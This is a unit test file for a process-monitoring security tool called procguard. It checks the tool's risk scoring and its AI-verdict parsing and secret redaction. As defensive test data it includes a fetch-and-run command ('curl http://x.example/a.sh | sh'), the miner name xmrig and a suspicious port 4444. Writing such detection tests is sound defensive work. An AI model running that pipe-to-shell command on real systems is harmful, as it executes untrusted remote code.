"""Run with:  python -m unittest discover -s tests"""
import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from procguard.ai_analyzer import parse_verdict, redact  # noqa: E402
from procguard.models import Level, ProcessInfo  # noqa: E402
from procguard.risk_engine import RiskEngine  # noqa: E402


def make(**kw) -> ProcessInfo:
    base = dict(pid=999999, ppid=1, name="thing", exe="/usr/bin/thing", cmdline=["thing"],
                username="me", create_time=1.0, status="running", num_threads=1,
                cpu_percent=0.0, mem_percent=0.1, mem_rss=1000)
    base.update(kw)
    return ProcessInfo(**base)


class RiskTests(unittest.TestCase):
    def setUp(self):
        self.e = RiskEngine()

    @unittest.skipUnless(sys.platform == "linux", "deleted-binary rule is Linux-only")
    def test_deleted_binary_flagged(self):
        with mock.patch("procguard.risk_engine.os.readlink", return_value="/usr/bin/ghost (deleted)"):
            r = self.e.assess(make(exe="/usr/bin/ghost"))
        self.assertTrue(any("deleted from disk" in x.text for x in r.reasons))

    @unittest.skipUnless(sys.platform == "linux", "deleted-binary rule is Linux-only")
    def test_other_mount_namespace_not_flagged(self):
        # Path doesn't exist from our view but the kernel doesn't say "(deleted)".
        with mock.patch("procguard.risk_engine.os.readlink", return_value="/not/visible/here"):
            r = self.e.assess(make(exe="/not/visible/here"))
        self.assertEqual(r.score, 0)

    def test_normal_is_low(self):
        self.assertEqual(self.e.assess(make()).level, Level.LOW)

    def test_temp_folder_is_medium(self):
        r = self.e.assess(make(exe="/tmp/x/payload", cmdline=["payload"]))
        self.assertEqual(r.level, Level.MEDIUM)
        self.assertTrue(any("temporary folder" in x.text for x in r.reasons))

    def test_pipe_to_shell_in_temp_is_high(self):
        r = self.e.assess(make(exe="/tmp/sh", name="sh",
                               cmdline=["sh", "-c", "curl http://x.example/a.sh | sh"]))
        self.assertEqual(r.level, Level.HIGH)

    def test_known_bad_name_is_high(self):
        self.assertEqual(self.e.assess(make(name="xmrig", exe="/opt/xmrig")).level, Level.HIGH)

    def test_suspicious_port(self):
        r = self.e.assess(make(remote=[("8.8.8.8", 4444)]))
        self.assertTrue(any(x.category == "network" for x in r.reasons))

    def test_private_ip_not_counted_as_external(self):
        r = self.e.assess(make(remote=[("192.168.1.5", 4444)]))
        self.assertEqual(r.score, 0)

    def test_office_spawning_shell(self):
        r = self.e.assess(make(name="cmd.exe", parent_name="WINWORD.EXE"))
        self.assertGreaterEqual(r.score, 45)

    def test_trusted_is_zero(self):
        e = RiskEngine({"/tmp/x/payload"})
        self.assertEqual(e.assess(make(exe="/tmp/x/payload")).score, 0)

    def test_resource_alone_stays_below_high(self):
        self.assertNotEqual(self.e.assess(make(cpu_percent=99, mem_percent=40)).level, Level.HIGH)


class AITests(unittest.TestCase):
    def test_redact_secrets(self):
        out = redact("tool --password=hunter2 --token abcdef " + "A" * 40)
        self.assertNotIn("hunter2", out)
        self.assertNotIn("A" * 40, out)

    def test_parse_verdict_fenced_json(self):
        v = parse_verdict('```json\n{"verdict": "Suspicious", "explanation": "odd"}\n```')
        self.assertEqual(v.verdict, "suspicious")

    def test_parse_verdict_garbage(self):
        self.assertEqual(parse_verdict("not json").verdict, "unknown")


if __name__ == "__main__":
    unittest.main()
